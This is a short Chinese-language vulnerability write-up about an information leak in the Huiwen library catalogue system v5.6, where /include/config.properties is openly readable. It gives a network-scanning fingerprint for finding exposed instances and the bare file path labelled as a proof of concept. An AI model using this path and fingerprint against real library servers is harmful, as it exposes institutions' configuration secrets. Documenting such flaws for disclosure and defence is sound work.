# 汇文 图书馆书目检索系统 config.properties 信息泄漏漏洞

## 漏洞描述

汇文 图书馆书目检索系统 /include/config.properties 文件中包含敏感信息，攻击者可以直接访问获取信息

## 漏洞影响

<a-checkbox checked>汇文v5.6</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="汇文软件-书目检索系统"</a-checkbox></br>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1630045057643-890dd489-c6a9-45c5-aec6-74c6cf88175a.png)

验证POC

```python
/include/config.properties
```

![img](../../../.vuepress/public/img/1630047202406-ff9604d5-fa69-4717-a916-ce2d0757d92c.png)